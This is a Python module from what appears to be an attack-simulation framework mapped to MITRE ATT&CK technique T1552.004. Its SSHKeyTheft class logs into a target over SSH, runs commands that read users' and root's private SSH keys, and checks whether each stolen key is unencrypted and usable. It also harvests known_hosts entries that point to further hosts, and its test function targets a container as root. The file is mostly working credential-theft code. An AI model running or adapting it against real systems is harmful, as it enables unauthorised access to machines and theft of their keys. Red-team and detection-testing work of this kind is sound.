#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat May 23 2026

@author: hounsousamuel
"""

import os
import sys
import io
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))

import time
import hashlib
import asyncio
import paramiko
import base64
from typing import Dict, Any, Optional, List

from tactics.execution.command_execution import CommandExecution
from tactics.mittres import MITRE
from simulateur_utils.logger import get_logger
from tactics.credential_access.data.ssh_key_theft_helper import (
    COMMANDS, TARGETS, PRIVATE_KEY_MARKERS, ENCRYPTION_MARKERS
)

logger = get_logger()


class SSHKeyTheft(CommandExecution):
    """
    Vol des clés SSH privées sur la machine cible.
    Technique MITRE ATT&CK: T1552.004
    """

    def __init__(
        self,
        name: str = "ssh_key_theft",
        timeout: int = 2,
        exec_timeout: int = 15,
        **kwargs
    ):
        super().__init__(name=name, timeout=timeout, exec_timeout=exec_timeout, **kwargs)
        self.theft_result: Dict[str, Any] = {}
        self.stolen_keys: List[Dict] = []
        self.known_hosts: List[str] = []

    # =========================================================================
    # PARSING
    # =========================================================================

    def _is_private_key(self, content: str) -> bool:
        return any(marker in content for marker in PRIVATE_KEY_MARKERS)

    # def _detect_key_type(self, content: str) -> str:
    #     for marker, key_type in PRIVATE_KEY_MARKERS.items():
    #         if marker in content:
    #             return key_type
    #     return "Unknown"

    def _detect_key_type(self, content: str) -> str:
        """
        Détection ultra-robuste du type de clé.
        Tente d'importer la clé avec chaque type supporté.
        Retourne: "RSA", "Ed25519", "ECDSA", "DSA", "PKCS8", "Unknown"
        """
        # Nettoyer le contenu
        content = content.strip()
        
        # 1. Test avec chaque type de clé paramiko
        key_types = {
            "RSA": paramiko.RSAKey,
            "Ed25519": paramiko.Ed25519Key,
            "ECDSA": paramiko.ECDSAKey,
            # "DSA": paramiko.DSSKey,
        }
        
        for key_name, key_class in key_types.items():
            try:
                key_class.from_private_key(io.StringIO(content))
                return key_name
            except paramiko.SSHException:
                continue
            except Exception:
                continue
        
        # 2. Si paramiko échoue, essayer de détecter par signature
        if "OPENSSH PRIVATE KEY" in content:
            try:
                lines = content.strip().split('\n')
                b64_lines = [l.strip() for l in lines if l.strip() and not l.startswith('-----')]
                b64_data = ''.join(b64_lines)
                decoded = base64.b64decode(b64_data)
                
                if b'ssh-rsa' in decoded:
                    return "RSA"
                if b'ssh-ed25519' in decoded:
                    return "Ed25519"
                if b'ecdsa-sha2-nistp' in decoded:
                    return "ECDSA"
            except Exception:
                pass
            return "OpenSSH"
        
        # 3. Marqueurs PEM simples
        if "BEGIN RSA PRIVATE KEY" in content:
            return "RSA"
        if "BEGIN EC PRIVATE KEY" in content:
            return "ECDSA"
        if "BEGIN DSA PRIVATE KEY" in content:
            return "DSA"
        if "BEGIN PRIVATE KEY" in content:
            return "PKCS8"
        
        return "Unknown"
        
    def _is_encrypted(self, content: str) -> bool:
        return any(m in content for m in ENCRYPTION_MARKERS)
    
    @classmethod
    def _parse_known_hosts(cls, content: str) -> List[Dict]:
        hosts = []
        seen = set()
        if not content:
            return hosts
        for line in content.strip().splitlines():
            line = line.strip()
            if not line or line.startswith("#") or line.startswith("!"):
                continue
            parts = line.split()
            if not parts:
                continue
            host_part = parts[0]
            if host_part.startswith("|"):  # hashé → illisible
                continue
            for h in host_part.split(","): # Ex  → ["[bandit.labs.overthewire.org]:2220"]
                h = h.strip()
                port = 22
                if all(char in h for char in ("[", "]")):
                    hsplit = h.split("]")
                    _port = hsplit[-1]
                    if ":" in _port:
                        port = _port.split(":")[-1]
                    h = hsplit[0][1:]
                if h in seen:
                    continue
                seen.add(h)
                hosts.append({"host": h, "port": int(port)})
        return hosts

    def _is_failed(self, cmd: str, output: str) -> bool:
        indicator = COMMANDS.get(cmd, {}).get("fail_indicator")
        return bool(indicator and output.strip() == indicator)

    def _get_key_name(self, cmd: str) -> str:
        """Extrait le nom de la clé depuis la commande."""
        for name in ("id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"):
            if name in cmd:
                return name
        return "unknown"

    def _compute_severity(self) -> str:
        usable = [k for k in self.stolen_keys if k["usable"]]
        if usable:
            return "CRITICAL"
        if self.stolen_keys:
            return "HIGH"
        if self.known_hosts:
            return "MEDIUM"
        return "LOW"
    
    def _verify_key_validity(self, key_content:str):
        for cls in (
            paramiko.RSAKey, paramiko.ECDSAKey, 
            paramiko.Ed25519Key,# paramiko.DSSKey
        ):
            try:
                cls.from_private_key(io.StringIO(key_content))
                return True
            
            except paramiko.SSHException as e:
                self.log(f'La clé {key_content[:80]} est invalide pour {cls}.\nErreur: {str(e)}', log=True)
            
            except Exception:
                pass
            
        return False

    # =========================================================================
    # CORE ASYNC
    # =========================================================================

    async def _steal_async(self, ip, port, username, password, pkey=None) -> Dict[str, Any]:
        self.log(f"Début SSHKeyTheft sur {username}@{ip}:{port}", log=True)
        self.start_time = time.time()

        exec_result = await self.exec_command_async(
            ip=ip, port=port, username=username, password=password,
            commands=list(COMMANDS.keys()), pkey=pkey
        )

        self.end_time = time.time()
        self.theft_result = exec_result

        for cmd, data in exec_result.get("results", {}).get("commands", {}).items():
            out = data["stdout"]
            # print("CMD :", cmd, "\n", out)
            if not out:
                continue
            if self._is_failed(cmd, out):
                self.log(f"Accès refusé : {COMMANDS.get(cmd, {}).get('description', cmd)}", log=True)
                continue

            # Clé privée détectée
            if self._is_private_key(out):
                source = "root" if "/root/" in cmd else username
                encrypted = self._is_encrypted(out)
                self.stolen_keys.append({
                    "name": self._get_key_name(cmd),
                    "source": source,
                    "type": self._detect_key_type(out),
                    "encrypted": encrypted,
                    "usable": (not encrypted) and self._verify_key_validity(out.strip()),
                    "content": out.strip(),
                    "content_preview": out.strip()[:80] + "...",
                    "cmd": cmd,
                    "cat_in_cmd": "cat" in cmd
                })
                self.log(
                    f"🔑 Clé volée : {self._get_key_name(cmd)} ({source}) — "
                    f"{'chiffrée' if encrypted else 'UTILISABLE DIRECTEMENT'}",
                    log=True
                )

            # known_hosts
            elif "known_hosts" in cmd:
                self.known_hosts.extend(self._parse_known_hosts(out))

        self.log(
            f"SSHKeyTheft terminé — {len(self.stolen_keys)} clé(s), "
            f"{len(self.known_hosts)} host(s) connus",
            log=True
        )
        return self._get_result()

    async def steal_async(self, ip, port, username, password, total_timeout=None, pkey=None) -> Dict[str, Any]:
        if total_timeout:
            try:
                async with asyncio.timeout(total_timeout):
                    return await self._steal_async(ip, port, username, password, pkey=pkey)
            except asyncio.TimeoutError:
                self.log(f"Timeout après {total_timeout}s", log=True)
                return self._get_result()
        return await self._steal_async(ip, port, username, password, pkey=pkey)

    def steal_sync(self, *args, **kwargs) -> Dict[str, Any]:
        return asyncio.run(self.steal_async(*args, **kwargs))

    # =========================================================================
    # RÉSULTAT
    # =========================================================================

    def _get_result(self) -> Dict[str, Any]:
        self.save()
        results = self.theft_result.get("results", {})
        usable_keys = [k for k in self.stolen_keys if k["usable"] and k["cat_in_cmd"]]
        return {
            "severity": self._compute_severity(),
            "elapsed": self.end_time - self.start_time if self.end_time and self.start_time else 0,
            "mitres": [MITRE.get("SSHKeyTheft", {})],
            "results": {
                "stolen_keys": self.stolen_keys,
                "stolen_keys_count": len(self.stolen_keys),
                "usable_keys": usable_keys,
                "usable_keys_count": len(usable_keys),
                "known_hosts": self.known_hosts,
                "known_hosts_count": len(self.known_hosts),
                "commands": results.get("commands", {}),
                "success_number": results.get("success_number", 0),
                "success_rate": results.get("success_rate", 0.0),
            },
        }


# =============================================================================
# Test
# =============================================================================

def test_ssh_key_theft(
    ip: str = "172.17.0.2", port: int = 22,
    username: str = "root", password: str = "toor",
    total_timeout: float = 30.0, pkey=None
):
    print(f"\n🗝️  Test SSHKeyTheft sur {username}@{ip}:{port}")
    print("-" * 50)

    result = SSHKeyTheft(timeout=5, exec_timeout=15).steal_sync(
        ip=ip, port=port, username=username, password=password,
        total_timeout=total_timeout, pkey=pkey
    )

    severity = result.get("severity", "UNKNOWN")
    icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢"}.get(severity, "⚪")
    r = result.get("results", {})

    print(f"\n{icon} Sévérité : {severity}")
    print(f"⏱️  Temps : {result.get('elapsed', 0):.2f}s")
    print(f"🔑 Clés volées : {r.get('stolen_keys_count', 0)}")
    for k in r.get("stolen_keys", []):
        status = "✅ UTILISABLE" if k["usable"] else "🔒 chiffrée"
        print(f"   {status} — {k['name']} ({k['type']}) depuis [{k['source']}]")
    print(f"🌐 Hosts connus : {r.get('known_hosts', [])[:10]}")
    return result


if __name__ == "__main__":
    test_ssh_key_theft()